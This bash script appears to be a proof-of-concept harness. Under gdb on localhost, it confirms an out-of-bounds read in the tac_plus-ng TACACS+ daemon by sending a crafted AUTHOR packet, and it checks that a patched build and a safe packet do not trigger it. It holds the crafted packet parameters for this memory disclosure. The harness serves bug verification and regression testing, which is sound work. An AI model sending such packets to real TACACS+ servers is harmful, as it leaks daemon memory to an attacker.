#!/usr/bin/env bash
# Live-daemon chosen-byte readback on plain (non-ASan) builds, under gdb.
# All listeners are plant-created 127.0.0.1 sockets passed to the daemon as
# fd 0. The daemon is a gdb child (ptrace_scope=1). Three cases: vulnerable
# crafted AUTHOR, fixed crafted AUTHOR, vulnerable safe AUTHOR.
set -u
cd "$(dirname "$0")"
H=$(pwd)
R=$(dirname "$H")
OS=linux-6.8.0-149-generic-x86_64
V="$R/src-plain/build/$OS/tac_plus-ng/tac_plus-ng"
VL="$R/src-plain/build/$OS/mavis"
F="$R/src-fixed-plain/build/$OS/tac_plus-ng/tac_plus-ng"
FL="$R/src-fixed-plain/build/$OS/mavis"
DATA='cmd=AAAAcmd=BBBBcmd=CCCCcmd=DDDDcmd=EEEEcmd=FFFFcmd=GGGGcmd=HHHH'
CHOSEN='AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHH'
FAIL=0

if [ ! -x "$V" ] || [ ! -x "$F" ]; then
    echo "plain builds missing; see PROVENANCE.md for the configure --debug --minimum commands"
    exit 2
fi

norm() {
    sed -E \
      -e 's/0x[0-9a-fA-F]+/0xADDR/g' \
      -e "s#$R#ROOT#g" "$1"
}

run_case() {
    local name="$1" bin="$2" libdir="$3" port="$4"
    shift 4
    python3 "$H/run_gdb_case.py" --bin "$bin" --libdir "$libdir" --port "$port" \
        --log "$H/gdb-$name.log" --gdbcmd "$H/gdb-author.cmd" "$@" \
        > "$H/gdb-$name.stdout" 2>/dev/null
    echo "case=$name runner_rc=$?"
}

emit() {
    local label="$1" file="$2" pattern="$3"
    if norm "$file" | grep -qE "$pattern"; then
        echo "PASS $label"
    else
        echo "FAIL $label (pattern /$pattern/ absent)"
        FAIL=$((FAIL + 1))
    fi
}

absent() {
    local label="$1" file="$2" pattern="$3"
    if norm "$file" | grep -qE "$pattern"; then
        echo "FAIL $label (unexpected /$pattern/)"
        FAIL=$((FAIL + 1))
    else
        echo "PASS $label"
    fi
}

extract() {
    local name="$1"
    {
        echo "case=$name"
        grep -a '^trigger:' "$H/gdb-$name.stdout" || true
        norm "$H/gdb-$name.log" | grep -E "^(ENTER|L75OOB|L77|L78) |$CHOSEN" \
            | sed -E "s/(\"$CHOSEN).*/\1\"/" | head -80
    }
}

echo "=== vulnerable pin + crafted AUTHOR, plain build under gdb ==="
run_case vuln "$V" "$VL" 4960 --arg0 8 --rest 19 --rest-byte 8 --data "$DATA"
emit vuln_chosen "$H/gdb-vuln.log" "\"$CHOSEN"
emit vuln_oob_read "$H/gdb-vuln.log" 'L75OOB i=.* off=[6-9][0-9]'
emit vuln_reply_18 "$H/gdb-vuln.stdout" 'reply_len=18'

echo "=== fixed pin + same packet ==="
run_case fixed "$F" "$FL" 4961 --arg0 8 --rest 19 --rest-byte 8 --data "$DATA"
absent fixed_no_eval "$H/gdb-fixed.log" '^ENTER '
emit fixed_reply_57 "$H/gdb-fixed.stdout" 'reply_len=57'

echo "=== vulnerable pin + safe packet ==="
run_case safe "$V" "$VL" 4962 --arg0 4 --rest 0 --data 'cmd='
if [ "$(grep -c '^ENTER ' "$H/gdb-safe.log")" = "1" ]; then
    echo "PASS safe_single_eval"
else
    echo "FAIL safe_single_eval"
    FAIL=$((FAIL + 1))
fi
absent safe_no_oob "$H/gdb-safe.log" 'L75OOB '
emit safe_reply_18 "$H/gdb-safe.stdout" 'reply_len=18'

echo "=== normalized evidence hashes ==="
for n in vuln fixed safe; do
    printf '%s ' "$n"
    extract "$n" | sha256sum | cut -d' ' -f1
done
echo "FAILURES=$FAIL"
exit "$FAIL"
